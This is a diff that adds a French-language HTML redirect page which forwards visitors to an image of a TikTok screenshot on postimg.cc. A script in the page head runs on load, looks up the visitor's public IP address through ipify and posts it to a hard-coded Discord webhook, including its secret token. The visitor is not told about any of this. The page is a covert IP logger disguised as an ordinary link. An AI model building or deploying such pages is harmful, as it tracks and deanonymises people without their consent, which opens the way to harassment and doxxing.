@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<script>
+function getUserIP() {
+  var ip;
+  fetch('https://api.ipify.org?format=json')
+    .then(response => response.json())
+    .then(data => {
+      ip = data.ip;
+      // Send IP address to Discord webhook
+      const webhookURL = "https://discord.com/api/webhooks/1367237113220698184/dRNpJg9cI-GD6PMGNHE22eAvjVPOIz5i8zfuIWOVADYCplQvQ3UBcqCL1vFet8CRtcMr";
+      const payload = {
+        content: `User IP: ${ip}`,
+      };
+      fetch(webhookURL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(payload),
+      })
+      .then((response) => response.json())
+      .then((data) => console.log("Success:", data))
+      .catch((error) => console.error("Error:", error));
+    });
+}
+getUserIP();
+</script>
+  <meta charset="UTF-8">
+  <meta http-equiv="refresh" content="0; url=https://i.postimg.cc/mkjgkBth/Screenshot-20250907-133847-com-zhiliaoapp-musically-edit-109533490277556.jpg">
+  <title>Redirection...</title>
+</head>
+<body>
+  <p>Si vous n'êtes pas redirigé automatiquement, <a href="https://i.postimg.cc/mkjgkBth/Screenshot-20250907-133847-com-zhiliaoapp-musically-edit-109533490277556.jpg">cliquez ici</a>.</p>
+</body>
+</html>
